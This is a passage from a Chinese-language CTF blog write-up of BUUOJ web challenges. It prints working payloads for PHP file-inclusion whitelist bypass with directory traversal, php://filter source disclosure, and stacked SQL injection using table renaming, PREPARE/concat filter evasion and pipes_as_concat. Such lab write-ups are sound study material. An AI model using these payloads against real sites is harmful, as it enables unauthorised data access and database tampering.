class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)  //在<span class="variable">$page</span>后接了一个<span class="string">&quot;?&quot;</span>,再取<span class="string">&quot;?&quot;</span>的位置  *</span><br><span class="line">                      // <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$a</span>,<span class="string">&#x27;?&#x27;</span>)返回<span class="string">&quot;?&quot;</span>在<span class="variable">$a</span>中第一次出现的位置</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;   <span class="comment">//白名单检测二</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);  <span class="comment">//进行URL解码并重复以上过程  **</span></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(  //但是我没想到URL编码对检测能有什么影响,毕竟白名单里</span><br><span class="line">                <span class="variable">$_page</span>,  //没有什么特殊字符</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;  <span class="comment">//白名单检测三</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//接下来为主程序逻辑</span></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])  <span class="comment">//传入非空</span></span><br><span class="line">        &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])  <span class="comment">//传入字符串</span></span><br><span class="line">        &amp;&amp; emmm::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])  <span class="comment">//通过check判定,也就是白名单三个过一个就行</span></span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];  <span class="comment">//传入file的值,进行文件包含操作 ***</span></span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>访问”hint.php”,得到提示:flag在”ffffllllaaaagggg”中</p>
+<p>然后啊，然后等我去学一下php&#x3D; &#x3D;(2022-3-14)</p>
+<hr>
+<p>好的，要学的其实不是php&#x3D; &#x3D;(2022-3-15)</p>
+<p>观察代码，会发现首先要经过三重检测，其中check检测最为麻烦，要想办法通过白名单。这里*处是有洞的,注意到是”?”检测，可以构造<code>?file=hint.php?...</code>来绕过白名单检测,但是如何读取”ffffllllaaaagggg”文件呢?注意到通过检测后传入的”file”会被直接文件包含(***处),考虑到前面必须绕过白名单不能修改,可以考虑利用目录穿越访问文件”ffffllllaaaagggg”。构造如下<code>?file=hint.php?/../ffffllllaaaagggg</code>，则**”hint.php?”会被当做目录处理**，然后试探”ffffllllaaaagggg”的位置即可</p>
+<p>**处的URL解码确实挺迷的，能过的payload不URL编码也能过，不能过的payload，URL编码后了还是能过，所以貌似只是出题人增加做题者的容错的。不过好像被传入后台的时候payload已经经过一次URL解码了，所以这里算是二次解码</p>
+<p>参考:[</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/angry_program/article/details/107855078" >目录穿越&#x2F;遍历漏洞 – 学习笔记 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>,</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44033675/article/details/121368078?shell=" >WP-1ance <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>,</p>
+<p>]</p>
+<h2 id="极客大挑战-2019-Havefun-一起来撸猫"><a href="#极客大挑战-2019-Havefun-一起来撸猫" class="headerlink" title="[极客大挑战 2019]Havefun-一起来撸猫~"></a>[极客大挑战 2019]Havefun-一起来撸猫~</h2><p>F12查看源码，发现真有源码&#x3D; &#x3D;</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$cat=$_GET[&#x27;cat&#x27;];</span><br><span class="line">   echo $cat;</span><br><span class="line">   if($cat==&#x27;dog&#x27;)&#123;</span><br><span class="line">      echo &#x27;Syc&#123;cat_cat_cat_cat&#125;&#x27;;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>用GET方法传入cat的值为dog即可得到flag</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://84ff6c98-583b-4e19-bdb6-749aff47ea71.node4.buuoj.cn:81?cat=dog</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p>网页没什么提示，看题目猜测为文件包含漏洞，然后啊，然后就啥也不知道了&#x3D; &#x3D;，查资料罢</p>
+<p>简单来说就是源码中有flag但被注释掉了，网页返回源码时我们看不到，所以需要利用php的filter协议对网页返回内容进行base64编码，破坏注释效果，再将其解码即可得到完整源码，从而得到flag。payload:<code>?file=php://filter/convert.base64-encode/resource=flag.php</code></p>
+<p>原理？看参考，参考最详细了~</p>
+<p><strong>参考:[</strong></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" >谈一谈php:&#x2F;&#x2F;filter的妙用 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_35544379/article/details/78230629" >php:&#x2F;&#x2F;filter技术分享 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45642610/article/details/112427044" >[ACTF2020 新生赛]Include 1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><strong>]</strong></p>
+<h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;  		#输入</span><br><span class="line"></span><br><span class="line">near &#x27;&#x27;&#x27;&#x27;&#x27; at line 1 		#输出</span><br></pre></td></tr></table></figure></div>
+
+<p>输入内容包着一层单引号</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1		#输入</span><br><span class="line"></span><br><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;hahahah&quot;</span><br><span class="line">&#125;		#输出</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or 1=1#		#输入</span><br><span class="line">=&gt;</span><br><span class="line">array(2) &#123;  #一个array是一行</span><br><span class="line">  [0]=&gt;		#一个键是一列字段</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;hahahah&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;2&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(12) &quot;miaomiaomiao&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(6) &quot;114514&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(2) &quot;ys&quot;</span><br><span class="line">&#125;		#输出</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;	-- 	#输入</span><br><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;hahahah&quot;</span><br><span class="line">&#125;		#输出-&gt;说明并非注释的功劳</span><br></pre></td></tr></table></figure></div>
+
+<pre><code>1&#39; or &#39;1&#39;=&#39;1		#输入
+array(2) &#123;
+  [0]=&gt;
+  string(1) &quot;1&quot;
+  [1]=&gt;
+  string(7) &quot;hahahah&quot;
+&#125;
+
+array(2) &#123;
+  [0]=&gt;
+  string(1) &quot;2&quot;
+  [1]=&gt;
+  string(12) &quot;miaomiaomiao&quot;
+&#125;
+
+array(2) &#123;
+  [0]=&gt;
+  string(6) &quot;114514&quot;
+  [1]=&gt;
+  string(2) &quot;ys&quot;
+&#125;		#输出-&gt;好怪哦，多一个真判定就会多出两条内容 -&gt;问题有待解决	&lt;?-1
+</code></pre>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or 1=1 order by 3#		#输入</span><br><span class="line">Unknown column &#x27;3&#x27; in &#x27;order clause&#x27;		#输出-&gt;只有两列</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;  union select 1			#输入</span><br><span class="line">return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);			#输出-&gt;正则过滤，&quot;\.&quot;表示&quot;.&quot;</span><br></pre></td></tr></table></figure></div>
+
+<p>好了没思路，求助百度罢&#x3D; &#x3D;</p>
+<h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>**整体思路:**先利用堆叠注入查询出数据库的库名、表名、表结构，从而判断出”flag”表”1919810931114514”中，而查询语句查询的是表”words”，也就是后台语句应该为:</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> words <span class="keyword">where</span> id <span class="operator">=</span> <span class="variable">@inject</span></span><br><span class="line"><span class="comment">-- 差不多是这个意思吧= =</span></span><br></pre></td></tr></table></figure></div>
+
+<p>要获取”1919810931114514”表中的flag有两条思路：</p>
+<ol>
+<li><p>由于”select”遭到过滤，读取语句被固定死只能查询”words”表的”id”段的条件，所以可以重命名表”1919810931114514”为”words”(当然你得先把 “words”重命名为别的)：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rename <span class="keyword">table</span> words <span class="keyword">to</span> othername;rename <span class="keyword">table</span> `<span class="number">1919810931114514</span>` <span class="keyword">to</span> words;</span><br></pre></td></tr></table></figure></div>
+
+<p>这里反引号有一个在Windows系统下才生效的细则:包裹库名、表名、索引、列名和别名必须用反引号，单双引号无效（这里是因为表名为数字，会导致数据类型混淆，才需要包裹）</p>
+<p>再将字段”flag”重命名为”id”:</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> words change flag id <span class="type">varchar</span>(<span class="number">100</span>) <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8 <span class="keyword">COLLATE</span> utf8_general_ci <span class="keyword">NOT</span> <span class="keyword">NULL</span>;</span><br></pre></td></tr></table></figure></div>
+
+<p>再用常规注入读取表内的所有记录即可:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or 1=1#   //输入表单中</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>用预处理语句、<code>concat()</code>函数绕过过滤，该函数可用于连接字符串:</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">concat(&quot;s&quot;,&quot;elect&quot;)  <span class="comment">-- 结果为select</span></span><br></pre></td></tr></table></figure></div>
+
+<p>构造预处理语句:</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="variable">@ext</span><span class="operator">=</span>concat(<span class="type">char</span>(<span class="number">115</span>,<span class="number">101</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">116</span>),<span class="string">&#x27; * from `1919810931114514`&#x27;</span>);</span><br><span class="line"><span class="comment">-- 这里利用了&quot;select&quot;ASCLL码转字符的方式绕过过滤，同时设置了一个ext变量用于PREPARE，但其实有没有都行 </span></span><br><span class="line"><span class="keyword">PREPARE</span> attack <span class="keyword">from</span> <span class="variable">@ext</span>;  <span class="comment">-- 向预执行语句&quot;attack&quot;传入ext的值</span></span><br><span class="line"><span class="keyword">EXECUTE</span> attack; <span class="comment">-- 执行语句</span></span><br></pre></td></tr></table></figure></div></li>
+</ol>
+<p>各自构造出合适的payload即可得到flag</p>
+<h3 id="遗留问题"><a href="#遗留问题" class="headerlink" title="遗留问题:"></a>遗留问题:</h3><ol>
+<li><p><code>&lt;?-1</code>:尚未解决</p>
+<p>猜想：也许是语句</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> words <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>中的<code>or 1=1</code>覆盖了<code>where id=&#39;1&#39;</code>的作用使得语句变成了</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> words <span class="keyword">WHERE</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure></div>
+
+<p>也就是说<code>or</code>起到了取并集的作用(当然也有判真假的作用)</p>
+</li>
+</ol>
+<p><strong>参考:[</strong></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/myseries/p/10821372.html" >myseries-SQL注入 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43915762/article/details/87909751" >YT–98-三种数据库的 SQL 注入详解 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/wjw-zm/p/12359735.html" >ZM思-WP <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><strong>]</strong></p>
+<h2 id="SUCTF-2019-EasySQL-1"><a href="#SUCTF-2019-EasySQL-1" class="headerlink" title="[SUCTF 2019]EasySQL 1"></a>[SUCTF 2019]EasySQL 1</h2><h3 id="Exp-1"><a href="#Exp-1" class="headerlink" title="Exp"></a>Exp</h3><ol>
+<li><p>它让我猜flag那我就猜:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;123&#125;</span><br><span class="line">-&gt;</span><br><span class="line">Nonono.</span><br></pre></td></tr></table></figure></div>
+
+<p>显然是没猜对</p>
+</li>
+<li><p>尝试基本注入:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;</span><br><span class="line">-&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>莫得反应</p>
+</li>
+<li><pre><code>1 //2,3,4,5等数字都是一样的
+Array ( [0] =&gt; 1 )
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">4. ```</span><br><span class="line">   1;show databases;#</span><br><span class="line">   -&gt;</span><br><span class="line">   Array ( [0] =&gt; 1 ) Array ( [0] =&gt; ctf ) Array ( [0] =&gt; ctftraining ) Array ( [0] =&gt; information_schema ) Array ( [0] =&gt; mysql ) Array ( [0] =&gt; performance_schema ) Array ( [0] =&gt; test )</span><br></pre></td></tr></table></figure></div>
+
+堆叠注入有效，那就继续查询表名
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1;show tables;#</span><br><span class="line">-&gt;</span><br><span class="line">Array ( [0] =&gt; 1 ) Array ( [0] =&gt; Flag )</span><br></pre></td></tr></table></figure></div>
+
+尝试改名
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1;rename table `1` to one;show tables;#</span><br><span class="line">-&gt;</span><br><span class="line">Array ( [0] =&gt; 1 )</span><br></pre></td></tr></table></figure></div>
+
+发现没有用，那就无法用改名的方式绕过了
+</code></pre>
+</li>
+<li><p>猜测语句为:</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> flag <span class="keyword">where</span> id <span class="operator">=</span> <span class="variable">@query</span> <span class="keyword">and</span> $query<span class="operator">=</span>flag</span><br></pre></td></tr></table></figure></div></li>
+</ol>
+<p>没法子了，求助百度罢</p>
+<h3 id="WP-1"><a href="#WP-1" class="headerlink" title="WP"></a>WP</h3><ol>
+<li><p>查阅资料后发现堆叠注入其实是有效的，纯属是我太菜了打错语法了…</p>
+<p>源码中可以看到”payload”被放在”query”中以”POST”方式提交</p>
+<p>回显”Nonono”原来是被过滤的意思？那”rename”为什么没用？</p>
+</li>
+<li><p>“GTX690M”的WP中的后台语句感觉有些不懂:</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">sql</span><span class="operator">=</span>&quot;select&quot;.<span class="keyword">sql</span><span class="operator">=</span>&quot;select&quot;.post[<span class="string">&#x27;query&#x27;</span>].&quot;||flag from Flag&quot;;</span><br></pre></td></tr></table></figure></div>
+
+<p>这里连接莫得空格，而且两个”select”能与两个赋值语句能拼出个啥？假设<code>query=1</code>，那得到的语句应该是：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span><span class="operator">||</span>flag <span class="keyword">from</span> Flag</span><br></pre></td></tr></table></figure></div>
+
+<p>所以得到的后台源码其实是：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> $_POST[<span class="string">&#x27;query&#x27;</span>] <span class="operator">||</span> flag <span class="keyword">from</span> Flag</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>如果<code>query=2</code></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select 2 || flag from Flag</span><br><span class="line">-&gt;</span><br><span class="line">Array ( [0] =&gt; 1 )</span><br></pre></td></tr></table></figure></div>
+
+<p>为什么值还是1？	<code>&lt;?-1</code></p>
+</li>
+<li><p>那么采用解法一的payload得到的语句应该如下:</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">*</span>,<span class="number">1</span></span><br><span class="line"><span class="operator">=</span><span class="operator">&gt;</span>  #后跟完整语句</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span>,<span class="number">1</span> <span class="operator">||</span> flag <span class="keyword">from</span> Flag</span><br><span class="line"><span class="operator">-</span><span class="operator">&gt;</span>  #后跟结果</span><br><span class="line"><span class="keyword">Array</span> ( [<span class="number">0</span>] <span class="operator">=</span><span class="operator">&gt;</span> flag&#123;<span class="number">34</span>abae4e<span class="number">-1</span>d69<span class="number">-4e63</span><span class="number">-95</span>dd<span class="number">-0834</span>d1800354&#125; [<span class="number">1</span>] <span class="operator">=</span><span class="operator">&gt;</span> <span class="number">1</span> )</span><br></pre></td></tr></table></figure></div>
+
+<p>很合理	</p>
+</li>
+<li><p>采用解法二的payload拼接得到：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>;<span class="keyword">set</span> sql_mode<span class="operator">=</span>pipes_as_concat;<span class="keyword">select</span> <span class="number">1</span></span><br><span class="line"><span class="operator">=</span><span class="operator">&gt;</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>;<span class="keyword">set</span> sql_mode<span class="operator">=</span>pipes_as_concat;<span class="keyword">select</span> <span class="number">1</span> <span class="operator">||</span> flag <span class="keyword">from</span> Flag</span><br><span class="line"><span class="operator">-</span><span class="operator">&gt;</span></span><br><span class="line"><span class="keyword">Array</span> ( [<span class="number">0</span>] <span class="operator">=</span><span class="operator">&gt;</span> <span class="number">1</span> ) <span class="keyword">Array</span> ( [<span class="number">0</span>] <span class="operator">=</span><span class="operator">&gt;</span> <span class="number">1</span>flag&#123;<span class="number">34</span>abae4e<span class="number">-1</span>d69<span class="number">-4e63</span><span class="number">-95</span>dd<span class="number">-0834</span>d1800354&#125; )</span><br></pre></td></tr></table></figure></div>
+
+<p>两个array代表两行结果，为什么比解法一多出一行结果？	<code>&lt;?-2</code></p>
+</li>
+<li><p>利用<a class="link"   target="_blank" rel="noopener" href="https://www.liaoxuefeng.com/wiki/1177760294764384/1179611432985088" >廖雪峰大佬的在线SQL <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>测试了一下:</p>
+<ol>
+<li><p>两个SELECT语句只显示后执行的</p>
+</li>
+<li><p>拼接后得到的结果并不会增加行数</p>
+</li>
+<li><p><code>SELECT 2</code>的结果如下:</p>
+<p>与实际效果有出入</p>
+</li>
+<li><p>纠正一下:该在线SQL的<code>||</code>默认就是连接符的作用，逻辑或只能直接用<code>or</code>，<code>0 or name</code>的效果</p>
+<p>还是很怪，如果是这样的那为什么输入0得不到flag？<code>&lt;?-3</code>  -&gt;  说明”flag”字段无法直接回显，只能通过拼接等特殊方式回显。反过来说，这里的逻辑或运行到右侧是基本没有结果的，所以才会想到payload:<code>*,1</code></p>
+</li>
+<li><p>测试语句<code>SELECT *,1 or name FROM students;</code></p>
+<p>一目了然，<code>,</code>把或运算符归并到了右侧并接在了全表的后面</p>
+</li>
+</ol>
+</li>
+</ol>
+<p><strong>总结:</strong></p>
+<p>后台语句：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> $post[<span class="string">&#x27;query&#x27;</span>]<span class="operator">||</span>flag <span class="keyword">from</span> Flag</span><br></pre></td></tr></table></figure></div>
+
+<p>将输入的内容”query”与无法直接回显的字段”flag”用或连接</p>
+<p><strong>办法一</strong>：绕过坑人的<code>||</code>，构造自己的select语句解决</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span>,<span class="number">1</span><span class="operator">||</span>flag <span class="keyword">from</span> flag</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>办法二</strong>：利用<code>||</code>，想办法让<code>Select 1||flag</code>输出我们想要的结果</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>;<span class="keyword">set</span> sql_mode<span class="operator">=</span>PIPES_AS_CONCAT;<span class="keyword">select</span> <span class="number">1</span><span class="operator">||</span>flag <span class="keyword">from</span> flag</span><br></pre></td></tr></table></figure></div>
+
+<p>但是如何判断出后台语句的结构还不是很懂	 <code>&lt;?-4</code></p>
+<h3 id="遗留的问题"><a href="#遗留的问题" class="headerlink" title="遗留的问题"></a>遗留的问题</h3><ul>
+<li><p><code>&lt;?-(1-3)</code>都没找到明确的答案，但其实意义不大</p>
+</li>
+<li><p><code>&lt;?-4</code>:不是很明确。</p>
+<p>但输入”0或字母”和”非0数字”的不同回显确实与<code>||</code>特性有关</p>
+</li>
+</ul>
+<p><strong>参考:[</strong></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/gtx690/p/13176458.html" >GTX690M-WP <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><strong>]</strong></p>
+<!-- flag of hidden posts -->
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> BUUOJ——WEB（一）</li>
+        <li><strong>Author:</strong> Forestsetyou</li>
+        <li><strong>Created at
+                :</strong> 2023-01-17 08:50:00</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2023-04-28 16:48:00
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://forestsetyou.github.io/2023/01/17/Security/CTF/BUUOJ——WEB（一）/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
